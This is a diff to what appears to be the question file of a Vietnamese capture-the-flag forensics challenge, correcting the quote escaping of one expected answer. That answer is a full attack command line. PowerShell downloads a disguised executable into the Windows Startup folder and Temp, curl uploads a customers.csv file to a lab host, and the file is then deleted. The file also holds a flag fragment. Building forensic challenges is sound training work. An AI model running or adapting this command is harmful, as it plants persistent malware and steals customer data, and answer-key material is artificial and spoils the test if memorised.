@@ -46,7 +46,7 @@ QUESTIONS = [
     {
         "q": "[Câu 3.2] Attacker đã sử dụng cách thức nào để tải mã độc về máy chủ:",
         # Giữ nguyên chuỗi payload dài khớp với script auto của người chơi
-        "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe\'); (New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Local\Temp\svch0st.exe\')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"''',
+        "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.0.2.15:8080/svch0st.exe','C:\Users\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe'); (New-Object System.NET.WebClient).DownloadFile('http://10.0.2.15:8080/svch0st.exe','C:\Users\Alice Wong\AppData\Local\Temp\svch0st.exe')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"''',
         "flag_part": "4lw4ys_h4v3_4_"
     },
     {
